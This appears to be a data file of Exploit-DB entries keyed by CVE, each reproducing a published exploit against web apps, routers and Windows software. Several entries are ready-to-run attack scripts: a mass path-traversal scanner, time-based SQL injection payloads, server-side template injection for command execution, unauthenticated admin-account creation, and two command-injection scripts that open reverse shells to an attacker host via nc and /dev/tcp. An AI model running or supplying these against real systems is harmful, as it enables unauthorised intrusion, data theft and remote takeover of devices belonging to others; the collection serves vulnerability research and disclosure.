CVE-2023-4382,2023-09-04,exploit db,"# Exploit Title: Hyip Rio 2.1 - Arbitrary File Upload # Exploit Author: CraCkEr # Date: 30/07/2023 # Vendor: tdevs # Vendor Homepage: https://tdevs.co/ # Software Link: https://hyiprio-feature.tdevs.co/ # Version: 2.1 # Tested on: Windows 10 Pro # Impact: Allows User to upload files to the web server # CVE: CVE-2023-4382 ## Description Allows Attacker to upload malicious files onto the server, such as Stored XSS ## Steps to Reproduce: 1. Login as a [Normal User] 2. In [User Dashboard], go to [Profile Settings] on this Path: https://website/user/settings 3. Upload any Image into the [avatar] 4. Capture the POST Request with [Burp Proxy Intercept] 5. Edit the file extension to .svg & inject your [Evil-Code] or [Stored XSS] POST /user/settings/profile-update HTTP/2 Content-Disposition: form-data; name=""avatar""; filename=""XSS.svg"" Content-Type: image/png ----------------------------------------------------------- 6. Send the Request 7. Capture the GET request from [Burp Logger] to get the Path of your Uploaded [Stored-XSS] or right-click on the Avatar and Copy the Link 8. Access your Uploded Evil file on this Path: https://website/assets/global/images/********************.svg [-] Done"
CVE-2023-4407,2023-09-04,exploit db,"# Exploit Title: Credit Lite 1.5.4 - SQL Injection # Exploit Author: CraCkEr # Date: 31/07/2023 # Vendor: Hobby-Tech # Vendor Homepage: https://codecanyon.net/item/credit-lite-micro-credit-solutions/39554392 # Software Link: https://credit-lite.appshat.xyz/ # Version: 1.5.4 # Tested on: Windows 10 Pro # Impact: Database Access # CVE: CVE-2023-4407 # CWE: CWE-89 - CWE-74 - CWE-707 ## Description SQL injection attacks can allow unauthorized access to sensitive data, modification of data and crash the application or make it unavailable, leading to lost revenue and damage to a company's reputation. ## Steps to Reproduce: To Catch the POST Request 1. Visit [Account Statement] on this Path: https://website/portal/reports/account_statement 2. Select [Start Date] + [End Date] + [Account Number] and Click on [Filter] Path: /portal/reports/account_statement POST parameter 'date1' is vulnerable to SQL Injection POST parameter 'date2' is vulnerable to SQL Injection POST /portal/reports/account_statement HTTP/2 _token=5k2IfXrQ8aueUQzrd5UfilSZzgOC5vyCPGxTTZDK&date1=[SQLi]&date2=[SQLi]&account_number=20005001 Parameter: date1 (POST) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: _token=5k2IfXrQ8aueUQzrd5UfilSZzgOC5vyCPGxTTZDK&date1=2023-07-31'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z&date2=2023-07-31&account_number=20005001 Parameter: date2 (POST) Type: time-based blind Title: MySQL >= 5.0.12 time-based blind (query SLEEP) Payload: _token=5k2IfXrQ8aueUQzrd5UfilSZzgOC5vyCPGxTTZDK&date1=2023-07-31&date2=2023-07-31'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z&account_number=20005001 [-] Done"
CVE-2022-23513,2023-09-04,exploit db,"# Exploit Title: AdminLTE PiHole < 5.18 - Broken Access Control # Google Dork: [inurl:admin/scripts/pi-hole/phpqueryads.php](https://vuldb.com/?exploit_googlehack.216554) # Date: 21.12.2022 # Exploit Author: kv1to # Version: Pi-hole v5.14.2; FTL v5.19.2; Web Interface v5.17 # Tested on: Raspbian / Debian # Vendor: https://github.com/pi-hole/AdminLTE/security/advisories/GHSA-6qh8-6rrj-7497 # CVE : CVE-2022-23513 In case of an attack, the threat actor will obtain the ability to perform an unauthorized query for blocked domains on queryads endpoint. ## Proof Of Concept with curl: curl 'http://pi.hole/admin/scripts/pi-hole/php/queryads.php?domain= ' ## HTTP requests GET /admin/scripts/pi-hole/php/queryads.php?domain= ' HTTP/1.1 HOST: pi.hole Cookie: [..SNIPPED..] [..SNIPPED..] ## HTTP Response HTTP/1.1 200 OK [..SNIPPED..] data: Match found in [..SNIPPED..] data: data: data:"
CVE-2023-39026,2023-09-04,exploit db,"# Exploit Title: FileMage Gateway 1.10.9 - Local File Inclusion # Date: 8/22/2023 # Exploit Author: Bryce ""Raindayzz"" Harty # Vendor Homepage: https://www.filemage.io/ # Version: Azure Versions < 1.10.9 # Tested on: All Azure deployments < 1.10.9 # CVE : CVE-2023-39026 # Technical Blog - https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html # Patch from vendor - https://www.filemage.io/docs/updates.html import requests import warnings warnings.filterwarnings(""ignore"") def worker(url): response = requests.get(url, verify=False, timeout=.5) return response def main(): listIP = [] file_path = input(""Enter the path to the file containing the IP addresses: "") with open(file_path, 'r') as file: ip_list = file.read().splitlines() searchString = ""tls"" for ip in ip_list: url = f""https://{ip}"" + ""/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml"" try: response = worker(url) #print(response.text) if searchString in response.text: print(""Vulnerable IP: "" + ip) print(response.text) listIP.append(ip) except requests.exceptions.RequestException as e: print(f""Error occurred for {ip}: {str(e)}"") for x in listIP: print(x) if __name__ == '__main__': main()"
CVE-2022-25148,2023-09-04,exploit db,"# Exploit Title: WP Statistics Plugin <= 13.1.5 current_page_id - Time based SQL injection (Unauthenticated) # Date: 13/02/2022 # Exploit Author: psychoSherlock # Vendor Homepage: https://wp-statistics.com/ # Software Link: https://downloads.wordpress.org/plugin/wp-statistics.13.1.5.zip # Version: 13.1.5 and prior # Tested on: wp-statistics 13.1.5 # CVE : CVE-2022-25148 # Vendor URL: https://wordpress.org/plugins/wp-statistics/ # CVSS Score: 8.4 (High) import argparse import requests import re import urllib.parse def main(): parser = argparse.ArgumentParser(description=""CVE-2022-25148"") parser.add_argument('-u', '--url', required=True, help='Wordpress base URL') args = parser.parse_args() baseUrl = args.url payload = ""IF(1=1, sleep(5), 1)"" wp_session = requests.session() resp = wp_session.get(baseUrl) nonce = re.search(r'_wpnonce=(.*?)℘_statistics_hit', resp.text).group(1) print(f""Gathered Nonce: {nonce}"") headers = { ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15""} payload = urllib.parse.quote_plus(payload) exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}℘_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0' exploit_url = baseUrl + exploit print(f'\nSending: {exploit_url}') resp = wp_session.get(exploit_url, headers=headers) if float(resp.elapsed.total_seconds()) >= 5.0: print(""\n!!! Target is vulnerable !!!"") print(f'\nTime taken: {resp.elapsed.total_seconds()}') else: print('Target is not vulnerable') if __name__ == ""__main__"": main()"
CVE-2023-4547,2023-09-04,exploit db,"# Exploit Title: SPA-Cart eCommerce CMS 1.9.0.3 - Reflected XSS # Exploit Author: CraCkEr # Date: 20/08/2023 # Vendor: SPA-Cart # Vendor Homepage: https://spa-cart.com/ # Software Link: https://demo.spa-cart.com/ # Version: 1.9.0.3 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4547 # CWE: CWE-79 - CWE-74 - CWE-707 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /search GET parameter 'filter[brandid]' is vulnerable to XSS GET parameter 'filter[price]' is vulnerable to XSS https://website/search?filtered=1&q=11&load_filter=1&filter[brandid]=[XSS]&filter[price]=[XSS]&filter[attr][Memory][]=500%20GB XSS Payloads: vnxjb""> bvu51 [-] Done"
CVE-2023-31468,2023-08-21,exploit db,"# Exploit Title: Inosoft VisiWin 7 2022-2.1 - Insecure Folders Permissions Privilege Escalation # Date: 2023-08-09 # Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia # Vendor Homepage: https://www.inosoft.com/ # Version: Up to 2022-2.1 (Runtime RT7.3 RC3 20221209.5) # Tested on: Windows # CVE: CVE-2023-31468 Inosoft VisiWin is a completely open system with a configurable range of functions. It combines all features of classic HMI software with unlimited programming possibilities. The installation of the solution will create insecure folder, and this could allow a malicious user to manipulate file content or change legitimate files (e.g., VisiWin7.Server.Manager.exe which runs with SYSTEM privileges) to compromise a system or to gain elevated privileges. This is the list of insecure files and folders with their respective permissions: C:\>icacls ""C:\Program Files (x86)\INOSOFT GmbH"" C:\Program Files (x86)\INOSOFT GmbH BUILTIN\Administrators:(OI)(CI)(F) Everyone:(OI)(CI)(F) NT AUTHORITY\SYSTEM:(OI)(CI)(F) Successfully processed 1 files; Failed processing 0 files C:\> C:\>icacls ""C:\Program Files (x86)\INOSOFT GmbH\VisiWin7\Runtime\VisiWin7.Server.Manager.exe"" C:\Program Files (x86)\INOSOFT GmbH\VisiWin 7\Runtime\VisiWin7.Server.Manager.exe BUILTIN\Administrators:(I)(F) Everyone:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) Successfully processed 1 files; Failed processing 0 files C:\>"
CVE-2023-31067,2023-08-21,exploit db,"# Exploit Title: TSplus 16.0.2.14 - Remote Access Insecure Files and Folders Permissions # Date: 2023-08-09 # Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia # Vendor Homepage: https://tsplus.net/ # Version: Up to 16.0.2.14 # Tested on: Windows # CVE : CVE-2023-31067 TSplus Remote Access (v. 16.0.2.14) is an alternative to Citrix and Microsoft RDS for remote desktop access and Windows application delivery. Web-enable your legacy apps, create SaaS solutions or remotely access your centralized corporate tools and files. The TSplus Remote Access solution comes with an embedded web server to allow remote users to easely connect remotely. However, insecure file and folder permissions are set and this could allow a malicious user to manipulate file content (e.g.: changing the code of html pages or js scripts) or change legitimate files (e.g. Setup-VirtualPrinter-Client.exe) in order to compromise a system or to gain elevated privileges. This is the list of insecure files and folders with their respective permissions: Everyone:(OI)(CF)(F) and Everyone(F) Permission: Everyone:(OI)(CI)(F) C:\Program Files (x86)\TSplus\Clients\www C:\Program Files (x86)\TSplus\Clients\www\addons C:\Program Files (x86)\TSplus\Clients\www\ConnectionClient C:\Program Files (x86)\TSplus\Clients\www\downloads C:\Program Files (x86)\TSplus\Clients\www\prints C:\Program Files (x86)\TSplus\Clients\www\RemoteAppClient C:\Program Files (x86)\TSplus\Clients\www\software C:\Program Files (x86)\TSplus\Clients\www\var C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\remoteapp C:\Program Files (x86)\TSplus\Clients\www\downloads\shared C:\Program Files (x86)\TSplus\Clients\www\software\java C:\Program Files (x86)\TSplus\Clients\www\software\js C:\Program Files (x86)\TSplus\Clients\www\software\html5\jwres C:\Program Files (x86)\TSplus\Clients\www\software\html5\locales C:\Program Files (x86)\TSplus\Clients\www\software\html5\imgs\topmenu C:\Program Files (x86)\TSplus\Clients\www\software\html5\imgs\key\parts C:\Program Files (x86)\TSplus\Clients\www\software\java\img C:\Program Files (x86)\TSplus\Clients\www\software\java\third C:\Program Files (x86)\TSplus\Clients\www\software\java\img\cp C:\Program Files (x86)\TSplus\Clients\www\software\java\img\srv C:\Program Files (x86)\TSplus\Clients\www\software\java\third\images C:\Program Files (x86)\TSplus\Clients\www\software\java\third\js C:\Program Files (x86)\TSplus\Clients\www\software\java\third\images\bramus C:\Program Files (x86)\TSplus\Clients\www\software\java\third\js\prototype C:\Program Files (x86)\TSplus\Clients\www\var\log C:\Program Files (x86)\TSplus\UserDesktop\themes C:\Program Files (x86)\TSplus\UserDesktop\themes\BlueBar C:\Program Files (x86)\TSplus\UserDesktop\themes\Default C:\Program Files (x86)\TSplus\UserDesktop\themes\GreyBar C:\Program Files (x86)\TSplus\UserDesktop\themes\Logon C:\Program Files (x86)\TSplus\UserDesktop\themes\MenuOnTop C:\Program Files (x86)\TSplus\UserDesktop\themes\Seamless C:\Program Files (x86)\TSplus\UserDesktop\themes\ThinClient C:\Program Files (x86)\TSplus\UserDesktop\themes\Vista Permission: Everyone:(F) C:\Program Files (x86)\TSplus\Clients\www\all.min.css C:\Program Files (x86)\TSplus\Clients\www\custom.css C:\Program Files (x86)\TSplus\Clients\www\popins.css C:\Program Files (x86)\TSplus\Clients\www\robots.txt C:\Program Files (x86)\TSplus\Clients\www\addons\Setup-VirtualPrinter-Client.exe C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\hb.exe.config C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\SessionPrelaunch.Common.dll.config C:\Program Files (x86)\TSplus\Clients\www\cgi-bin\remoteapp\index.html C:\Program Files (x86)\TSplus\Clients\www\RemoteAppClient\index.html C:\Program Files (x86)\TSplus\Clients\www\software\common.css C:\Program Files (x86)\TSplus\Clients\www\software\html5\jwres\jwwebsockify.jar C:\Program Files (x86)\TSplus\Clients\www\software\html5\jwres\web.jar C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\exitlist.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\exitupload.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\getlist.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\getupload.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\postupload.html C:\Program Files (x86)\TSplus\Clients\www\software\html5\own\uploaderr.html C:\Program Files (x86)\TSplus\Clients\www\software\java\index.html C:\Program Files (x86)\TSplus\Clients\www\software\java\img\index.html C:\Program Files (x86)\TSplus\Clients\www\software\java\img\port.bin C:\Program Files (x86)\TSplus\Clients\www\software\java\third\jws.js C:\Program Files (x86)\TSplus\Clients\www\software\java\third\sha256.js C:\Program Files (x86)\TSplus\Clients\www\software\java\third\js\prototype\prototype.js C:\Program Files (x86)\TSplus\Clients\www\software\js\jquery.min.js"
CVE-2023-31068,2023-08-21,exploit db,"# Exploit Title: TSplus 16.0.0.0 - Remote Work Insecure Files and Folders Permissions # Date: 2023-08-09 # Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia # Vendor Homepage: https://tsplus.net/ # Version: Up to 16.0.0.0 # Tested on: Windows # CVE : CVE-2023-31068 With TSPlus Remote Work (v. 16.0.0.0) you can create a secure single sign-on web portal and remote desktop gateway that enables users to remotely access the console session of their office PC. The solution comes with an embedded web server to allow remote users to easely connect remotely. However, insecure file and folder permissions are set, and this could allow a malicious user to manipulate file content (e.g.: changing the code of html pages or js scripts) or change legitimate files (e.g. Setup-RemoteWork-Client.exe) in order to compromise a system or to gain elevated privileges. This is the list of insecure files and folders with their respective permissions: Permission: Everyone:(OI)(CI)(F) C:\Program Files (x86)\TSplus-RemoteWork\Clients\www C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\downloads C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\prints C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\var C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\remoteapp C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\downloads\shared C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5 C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\jwres C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\locales C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\own C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\des C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\key C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\topmenu C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\imgs\key\parts C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\cp C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\srv C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\images C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\images\bramus C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\js\prototype C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\var\log Permission: Everyone:(F) C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\robots.txt C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\hb.exe.config C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\SessionPrelaunch.Common.dll.config C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\cgi-bin\remoteapp\index.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download\common.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download\lang.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\download\Setup-RemoteWork-Client.exe C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\jwres\jwwebsockify.jar C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\jwres\web.jar C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\own\exitlist.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\html5\own\exitupload.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\index.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\index.html C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\img\port.bin C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\jws.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\sha256.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\java\third\js\prototype\prototype.js C:\Program Files (x86)\TSplus-RemoteWork\Clients\www\software\js\jquery.min.js"
CVE-2023-31069,2023-08-21,exploit db,"# Exploit Title: TSPlus 16.0.0.0 - Remote Work Insecure Credential storage # Date: 2023-08-09 # Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia # Vendor Homepage: https://tsplus.net/ # Version: Up to 16.0.0.0 # Tested on: Windows # CVE : CVE-2023-31069 With TSPlus Remote Work (v. 16.0.0.0) you can create a secure single sign-on web portal and remote desktop gateway that enables users to remotely access the console session of their office PC. It is possible to create a custom web portal login page which allows a user to login without providing their credentials. However, the credentials are stored in an insecure manner since they are saved in cleartext, within the html login page. This means that everyone with an access to the web login page, can easely retrieve the credentials to access to the application by simply looking at the html code page. This is a code snippet extracted by the source code of the login page (var user and var pass): var user = ""Admin""; // Login to use when connecting to the remote server (leave """" to use the login typed in this page) var pass = ""SuperSecretPassword""; // Password to use when connecting to the remote server (leave """" to use the password typed in this page) var domain = """"; // Domain to use when connecting to the remote server (leave """" to use the domain typed in this page) var server = ""127.0.0.1""; // Server to connect to (leave """" to use localhost and/or the server chosen in this page) var port = """"; // Port to connect to (leave """" to use localhost and/or the port of the server chosen in this page) var lang = ""as_browser""; // Language to use var serverhtml5 = ""127.0.0.1""; // Server to connect to, when using HTML5 client var porthtml5 = ""3389""; // Port to connect to, when using HTML5 client var cmdline = """"; // Optional text that will be put in the server's clipboard once connected"
CVE-2023-37759,2023-08-21,exploit db,"# Exploit Title: Crypto Currency Tracker (CCT) 9.5 - Admin Account Creation (Unauthenticated) # Date: 11.08.2023 # Exploit Author: 0xBr # Software Link: https://codecanyon.net/item/crypto-currency-tracker-prices-charts-news-icos-info-and-more/21588008 # Version: <=9.5 # CVE: CVE-2023-37759 POST /en/user/register HTTP/2 Host: localhost Cookie: XSRF-TOKEN=[TOKEN]; laravel_session=[LARAVEL_SESSION]; SELECTED_CURRENCY=USD; SELECTED_CURRENCY_PRICE=1; cookieconsent_status=dismiss Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 756 _token=[_TOKEN]&name=testing&role_id=1&email=testing%40testing.testing&password=testing&g-recaptcha-response=[G-RECAPTCHA-RESPONSE]&submit_register=Register"
CVE-2022-47636,2023-08-10,exploit db,"# Exploit Title: OutSystems Service Studio 11.53.30 - DLL Hijacking # Date: 2023-08-09 # Exploit Author: Carlo Di Dato for Deloitte Risk Advisory Italia # Vendor Homepage: https://www.outsystems.com/ # Version: Up to 11.53.30 (Build 61739) # Tested on: Windows # CVE : CVE-2022-47636 A DLL hijacking vulnerability has been discovered in OutSystems Service Studio 11 11.53.30 build 61739. When a user open a .oml file (OutSystems Modeling Language), the application will load the following DLLs from the same directory: av_libGLESv2.dll libcef.DLL user32.dll d3d10warp.dll Using a crafted DLL, it is possible to execute arbitrary code in the context of the current logged in user."
CVE-2023-1389,2023-08-10,exploit db,"#!/usr/bin/python3 # Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection # Date: 07/25/2023 # Exploit Author: Voyag3r (https://github.com/Voyag3r-Security) # Vendor Homepage: https://www.tp-link.com/us/ # Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389) # Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0 # CVE: CVE-2023-1389 # Disclaimer: This script is intended to be used for educational purposes only. # Do not run this against any system that you do not have permission to test. # The author will not be held responsible for any use or damage caused by this # program. # CVE-2023-1389 is an unauthenticated command injection vulnerability in the web # management interface of the TP-Link Archer AX21 (AX1800), specifically, in the # *country* parameter of the *write* callback for the *country* form at the # ""/cgi-bin/luci/;stok=/locale"" endpoint. By modifying the country parameter it is # possible to run commands as root. Execution requires sending the request twice; # the first request sets the command in the *country* value, and the second request # (which can be identical or not) executes it. # This script is a short proof of concept to obtain a reverse shell. To read more # about the development of this script, you can read the blog post here: # https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94 # Before running the script, start a nc listener on your preferred port -> run the script -> profit import requests, urllib.parse, argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning # Suppress warning for connecting to a router with a self-signed certificate requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # Take user input for the router IP, and attacker IP and port parser = argparse.ArgumentParser() parser.add_argument(""-r"", ""--router"", dest = ""router"", default = ""192.168.0.1"", help=""Router name"") parser.add_argument(""-a"", ""--attacker"", dest = ""attacker"", default = ""127.0.0.1"", help=""Attacker IP"") parser.add_argument(""-p"", ""--port"",dest = ""port"", default = ""9999"", help=""Local port"") args = parser.parse_args() # Generate the reverse shell command with the attacker IP and port revshell = urllib.parse.quote(""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "" + args.attacker + "" "" + args.port + "" >/tmp/f"") # URL to obtain the reverse shell url_command = ""https://"" + args.router + ""/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$("" + revshell + "")"" # Send the URL twice to run the command. Sending twice is necessary for the attack r = requests.get(url_command, verify=False) r = requests.get(url_command, verify=False)"
CVE-2023-4168,2023-08-08,exploit db,"# Exploit Title: Adlisting Classified Ads 2.14.0 - WebPage Content Information Disclosure # Exploit Author: CraCkEr # Date: 25/07/2023 # Vendor: Templatecookie # Vendor Homepage: https://templatecookie.com/ # Software Link: https://templatecookie.com/demo/adlisting-classified-ads-script # Version: 2.14.0 # Tested on: Windows 10 Pro # Impact: Sensitive Information Leakage # CVE: CVE-2023-4168 ## Description Information disclosure issue in the redirect responses, When accessing any page on the website, Sensitive data, such as API keys, server keys, and app IDs, is being exposed in the body of these redirects. ## Steps to Reproduce: When you visit any page on the website, like: https://website/ad-list?category=electronics https://website/ad-list-search?page=2 https://website/ad-list-search?keyword=⪫=&long=&long=⪫=&location=&category=&keyword= in the body page response there's information leakage for google_map_key api_key auth_domain project_id storage_bucket messaging_sender_id app_id measurement_id Note: The same information leaked, such as the API keys, server keys, and app ID, was added to the ""Firebase Push Notification Configuration"" in the Administration Panel. Settings of ""Firebase Push Notification Configuration"" in the Administration Panel, on this Path: https://website/push-notification (Login as Administrator) [-] Done"
CVE-2023-29689,2023-08-08,exploit db,"# Exploit Title: Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated) # Exploit Author: Daniel Barros (@cupc4k3d) - Hakai Offensive Security # Date: 03/08/2023 # Vendor: https://pyrocms.com/ # Software Link: https://pyrocms.com/documentation/pyrocms/3.9/getting-started/installation # Vulnerable Version(s): 3.9 # CVE: CVE-2023-29689 # Notes: You need a user who has access to /admin privilege # Example Usage: # First, run the script: python3 CVE-2023-29689.py # Please follow these steps: # 1. Enter the application URL: http://localhost:8000 # 2. Enter the email for authentication: admin@adm.com # 3. Enter the password: Admin@@2023 # 4. Enter the command to be executed: id # Result of command execution: # uid=1000(cupcake) gid=1000(cupcake) groups=1000(cupcake) import requests from bs4 import BeautifulSoup from urllib.parse import urljoin def login(session, url, email, password): login_url = urljoin(url, '/admin/login') response = session.get(login_url) soup = BeautifulSoup(response.content, 'html.parser') token = soup.find('input', {'name': '_token'})['value'] payload = { '_token': token, 'email': email, 'password': password session.post(login_url, data=payload) # Function to edit role 1 and extract the Description of the Admin user. def edit_role_and_extract_description(session, url, command): edit_role_url = urljoin(url, '/admin/users/roles/edit/1') response = session.get(edit_role_url) soup = BeautifulSoup(response.content, 'html.parser') token = soup.find('input', {'name': '_token'})['value'] payload = { '_token': token, 'name_en': 'Admin', 'slug': 'admin', 'description_en': f'{{{{[""{command}""]|map(""system"")|join}}}}', 'action': 'save_exit' session.post(edit_role_url, data=payload) # Extract the updated Description from role 1. response = session.get(urljoin(url, '/admin/users/roles')) soup = BeautifulSoup(response.content, 'html.parser') description = soup.find('td', {'data-title': 'Description'}).text.strip() return description def main(): url = input(""Enter the application URL: "") email = input(""Enter the email for authentication: "") password = input(""Enter the password : "") command = input(""Enter the command to be executed: "") with requests.Session() as session: login(session, url, email, password) description = edit_role_and_extract_description(session, url, command) print(""\nResult of command execution:"") print(description) if __name__ == ""__main__"": main()"
CVE-2023-4173,2023-08-08,exploit db,"# Exploit Title: mooSocial 3.1.8 - Reflected XSS # Exploit Author: CraCkEr # Date: 28/07/2023 # Vendor: mooSocial # Vendor Homepage: https://moosocial.com/ # Software Link: https://travel.moosocial.com/ # Version: 3.1.8 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4173 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials URL path folder is vulnerable to XSS https://website/classifieds[XSS]/search?category=1 https://website/classifieds/search[XSS]?category=1 XSS Payloads: ijz3y""> y4apk [-] Done"
CVE-2023-4174,2023-08-08,exploit db,"# Exploit Title: Social-Commerce 3.1.6 - Reflected XSS # Exploit Author: CraCkEr # Date: 28/07/2023 # Vendor: mooSocial # Vendor Homepage: https://moosocial.com/ # Software Link: https://social-commerce.moosocial.com/ # Version: 3.1.6 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4174 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /search/index GET parameter 'q' is vulnerable to XSS https://website/search/index?q=[XSS] URL path folder [1,2] is vulnerable to XSS https://website/stores[XSS]/all-products?store_id=&keyword=&price_from=&price_to=&rating=&store_category_id=&sortby=most_recent https://website/user_info[XSS]/index/friends https://website/user_info/index[XSS]/friends https://website/faqs[XSS]/index?content_search= https://website/faqs/index[XSS]?content_search= XSS Payloads: j8chn""> ridxm [-] Done"
CVE-2023-37569,2023-08-08,exploit db,"#!/bin/bash # Exploit Title: Emagic Data Center Management Suite v6.0 - OS Command Injection # Date: 03-08-2023 # Exploit Author: Shubham Pandey & thewhiteh4t # Vendor Homepage: https://www.esds.co.in/enlight360 # Version: 6.0.0 # Tested on: Kali Linux # CVE : CVE-2023-37569 URL=$1 LHOST=$2 LPORT=$3 echo ""*****************************"" echo ""* ESDS eMagic 6.0.0 RCE *"" echo ""* > CVE-2023-37569 *"" echo ""* > Shubham & thewhiteh4t *"" echo ""*****************************"" if [ $# -lt 3 ]; then echo """""" USAGE : ./exploit.sh http:// ./exploit.sh http://192.168.0.10 192.168.0.20 1337 exit 1 fi url=""$1/index.php/monitor/operations/utilities/"" echo ""[+] URL : $URL"" echo ""[+] LHOST : $LHOST"" echo ""[+] LPORT : $LPORT"" echo payload=""bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27"" post_data=""utility=ping&operations=yes&hostname=%3B%20$payload&param_before=&param_after=&probe_id=1&rndval=1682490204846"" echo ""[!] Triggering exploit..."" echo $url (sleep 3; curl -s -X POST -d $post_data $url > /dev/null) & echo ""[+] Catching shell..."" nc -lvp 4444"
